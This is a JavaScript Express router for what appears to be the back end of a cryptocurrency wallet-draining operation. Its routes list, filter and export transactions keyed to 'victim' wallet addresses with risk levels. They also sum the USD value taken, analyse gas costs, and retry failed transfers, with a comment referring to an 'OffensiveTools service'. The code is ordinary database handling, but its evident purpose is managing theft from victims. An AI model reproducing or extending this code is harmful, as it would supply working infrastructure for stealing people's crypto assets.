const express = require('express');
const router = express.Router();
const { asyncHandler } = require('../middleware/errorHandler');
const { requirePermission } = require('../middleware/auth');
const Transaction = require('../models/Transaction');

// Get all transactions with pagination and filtering
router.get('/', requirePermission('canViewTransactions'), asyncHandler(async (req, res) => {
    const {
        page = 1,
        limit = 50,
        network,
        status,
        type,
        token,
        victim,
        sortBy = 'createdAt',
        sortOrder = 'desc',
        startDate,
        endDate
    } = req.query;

    const query = {};

    // Apply filters
    if (network) query.network = network;
    if (status) query.status = status;
    if (type) query.type = type;
    if (token) query.tokenSymbol = { $regex: token, $options: 'i' };
    if (victim) query.victim = victim;

    // Date range filter
    if (startDate || endDate) {
        query.createdAt = {};
        if (startDate) query.createdAt.$gte = new Date(startDate);
        if (endDate) query.createdAt.$lte = new Date(endDate);
    }

    const options = {
        page: parseInt(page),
        limit: parseInt(limit),
        sort: { [sortBy]: sortOrder === 'desc' ? -1 : 1 },
        populate: [
            { path: 'victim', select: 'address network riskLevel' },
            { path: 'contract', select: 'name network address' }
        ]
    };

    const transactions = await Transaction.paginate(query, options);

    // Calculate summary statistics
    const summary = {
        totalTransactions: transactions.totalDocs,
        totalValue: transactions.docs.reduce((sum, tx) => sum + (parseFloat(tx.usdValue) || 0), 0),
        confirmedTransactions: transactions.docs.filter(tx => tx.status === 'confirmed').length,
        failedTransactions: transactions.docs.filter(tx => tx.status === 'failed').length,
        pendingTransactions: transactions.docs.filter(tx => tx.status === 'pending').length
    };

    res.json({
        transactions: transactions.docs,
        pagination: {
            page: transactions.page,
            totalPages: transactions.totalPages,
            totalTransactions: transactions.totalDocs,
            hasNext: transactions.hasNextPage,
            hasPrev: transactions.hasPrevPage
        },
        summary
    });
}));

// Get transaction by ID
router.get('/:id', requirePermission('canViewTransactions'), asyncHandler(async (req, res) => {
    const transaction = await Transaction.findById(req.params.id)
        .populate('victim', 'address network riskLevel ensName')
        .populate('contract', 'name network address abi');

    if (!transaction) {
        return res.status(404).json({ error: 'Transaction not found' });
    }

    res.json(transaction);
}));

// Update transaction status
router.put('/:id/status', requirePermission('canEditTransactions'), asyncHandler(async (req, res) => {
    const { status, notes } = req.body;

    const validStatuses = ['pending', 'confirmed', 'failed', 'cancelled'];
    if (!validStatuses.includes(status)) {
        return res.status(400).json({ error: 'Invalid status' });
    }

    const updateData = { status };
    if (notes) updateData.notes = notes;
    updateData.updatedAt = new Date();

    const transaction = await Transaction.findByIdAndUpdate(
        req.params.id,
        updateData,
        { new: true, runValidators: true }
    ).populate('victim contract');

    if (!transaction) {
        return res.status(404).json({ error: 'Transaction not found' });
    }

    res.json(transaction);
}));

// Get transaction statistics
router.get('/stats/overview', requirePermission('canViewTransactions'), asyncHandler(async (req, res) => {
    const thirtyDaysAgo = new Date();
    thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);

    const stats = await Transaction.aggregate([
        {
            $match: {
                createdAt: { $gte: thirtyDaysAgo }
            }
        },
        {
            $group: {
                _id: {
                    status: '$status',
                    network: '$network',
                    type: '$type'
                },
                count: { $sum: 1 },
                totalValue: { $sum: { $toDouble: '$usdValue' } },
                totalGas: { $sum: { $toDouble: '$fee' } }
            }
        },
        {
            $group: {
                _id: '$_id.status',
                networks: {
                    $push: {
                        network: '$_id.network',
                        count: '$count',
                        value: '$totalValue',
                        gas: '$totalGas'
                    }
                },
                totalCount: { $sum: '$count' },
                totalValue: { $sum: '$totalValue' },
                totalGas: { $sum: '$totalGas' }
            }
        }
    ]);

    // Format the response
    const formattedStats = {};
    stats.forEach(stat => {
        formattedStats[stat._id] = {
            totalCount: stat.totalCount,
            totalValue: stat.totalValue,
            totalGas: stat.totalGas,
            networks: stat.networks
        };
    });

    res.json(formattedStats);
}));

// Get transactions by network
router.get('/network/:network', requirePermission('canViewTransactions'), asyncHandler(async (req, res) => {
    const { network } = req.params;
    const { page = 1, limit = 50, status } = req.query;

    const query = { network };
    if (status) query.status = status;

    const transactions = await Transaction.paginate(query, {
        page: parseInt(page),
        limit: parseInt(limit),
        sort: { createdAt: -1 },
        populate: [
            { path: 'victim', select: 'address riskLevel' },
            { path: 'contract', select: 'name address' }
        ]
    });

    res.json(transactions);
}));

// Get transactions by victim
router.get('/victim/:victimId', requirePermission('canViewTransactions'), asyncHandler(async (req, res) => {
    const { victimId } = req.params;
    const { page = 1, limit = 50, status } = req.query;

    const query = { victim: victimId };
    if (status) query.status = status;

    const transactions = await Transaction.paginate(query, {
        page: parseInt(page),
        limit: parseInt(limit),
        sort: { createdAt: -1 },
        populate: [
            { path: 'contract', select: 'name network address' }
        ]
    });

    res.json(transactions);
}));

// Get failed transactions for retry
router.get('/failed/list', requirePermission('canEditTransactions'), asyncHandler(async (req, res) => {
    const failedTransactions = await Transaction.find({
        status: 'failed',
        retryCount: { $lt: 3 } // Only show transactions that haven't been retried 3 times
    })
    .sort({ createdAt: -1 })
    .populate('victim', 'address network')
    .populate('contract', 'name network')
    .limit(100);

    res.json(failedTransactions);
}));

// Retry failed transaction
router.post('/:id/retry', requirePermission('canEditTransactions'), asyncHandler(async (req, res) => {
    const transaction = await Transaction.findById(req.params.id);

    if (!transaction) {
        return res.status(404).json({ error: 'Transaction not found' });
    }

    if (transaction.status !== 'failed') {
        return res.status(400).json({ error: 'Transaction is not in failed state' });
    }

    if (transaction.retryCount >= 3) {
        return res.status(400).json({ error: 'Maximum retry attempts reached' });
    }

    // Increment retry count and reset status
    transaction.retryCount += 1;
    transaction.status = 'pending';
    transaction.notes = `Retry attempt ${transaction.retryCount}`;
    transaction.updatedAt = new Date();

    await transaction.save();

    // Here you would trigger the retry logic in your OffensiveTools service
    // For now, we'll just update the transaction status

    res.json({
        message: 'Transaction queued for retry',
        transaction
    });
}));

// Bulk update transaction status
router.post('/bulk/status', requirePermission('canEditTransactions'), asyncHandler(async (req, res) => {
    const { transactionIds, status, notes } = req.body;

    if (!transactionIds || !Array.isArray(transactionIds) || !status) {
        return res.status(400).json({ error: 'Transaction IDs array and status are required' });
    }

    const validStatuses = ['pending', 'confirmed', 'failed', 'cancelled'];
    if (!validStatuses.includes(status)) {
        return res.status(400).json({ error: 'Invalid status' });
    }

    const updateData = {
        status,
        updatedAt: new Date()
    };
    if (notes) updateData.notes = notes;

    const result = await Transaction.updateMany(
        { _id: { $in: transactionIds } },
        updateData
    );

    res.json({
        message: `Updated ${result.modifiedCount} transactions`,
        modifiedCount: result.modifiedCount
    });
}));

// Get transaction gas analysis
router.get('/gas/analysis', requirePermission('canViewTransactions'), asyncHandler(async (req, res) => {
    const gasAnalysis = await Transaction.aggregate([
        {
            $match: {
                status: 'confirmed',
                fee: { $exists: true, $ne: null }
            }
        },
        {
            $group: {
                _id: '$network',
                avgGas: { $avg: { $toDouble: '$fee' } },
                minGas: { $min: { $toDouble: '$fee' } },
                maxGas: { $max: { $toDouble: '$fee' } },
                totalGas: { $sum: { $toDouble: '$fee' } },
                count: { $sum: 1 }
            }
        },
        {
            $project: {
                network: '$_id',
                avgGas: 1,
                minGas: 1,
                maxGas: 1,
                totalGas: 1,
                count: 1,
                gasPerTransaction: { $divide: ['$totalGas', '$count'] }
            }
        },
        { $sort: { totalGas: -1 } }
    ]);

    res.json(gasAnalysis);
}));

// Export transactions to CSV
router.get('/export/csv', requirePermission('canViewTransactions'), asyncHandler(async (req, res) => {
    const { startDate, endDate, network, status } = req.query;

    const query = {};
    if (network) query.network = network;
    if (status) query.status = status;
    if (startDate || endDate) {
        query.createdAt = {};
        if (startDate) query.createdAt.$gte = new Date(startDate);
        if (endDate) query.createdAt.$lte = new Date(endDate);
    }

    const transactions = await Transaction.find(query)
        .populate('victim', 'address network')
        .populate('contract', 'name network')
        .sort({ createdAt: -1 })
        .limit(10000); // Limit to prevent memory issues

    // Convert to CSV format
    const csvHeaders = [
        'ID',
        'Victim Address',
        'Network',
        'Token Symbol',
        'Amount',
        'USD Value',
        'Gas Fee',
        'Status',
        'Type',
        'Contract Name',
        'Created At',
        'Updated At'
    ];

    const csvRows = transactions.map(tx => [
        tx._id,
        tx.victim?.address || '',
        tx.network,
        tx.tokenSymbol,
        tx.amount,
        tx.usdValue,
        tx.fee,
        tx.status,
        tx.type,
        tx.contract?.name || '',
        tx.createdAt,
        tx.updatedAt
    ]);

    const csvContent = [csvHeaders, ...csvRows]
        .map(row => row.map(field => `"${field}"`).join(','))
        .join('\n');

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename="transactions.csv"');
    res.send(csvContent);
}));

module.exports = router;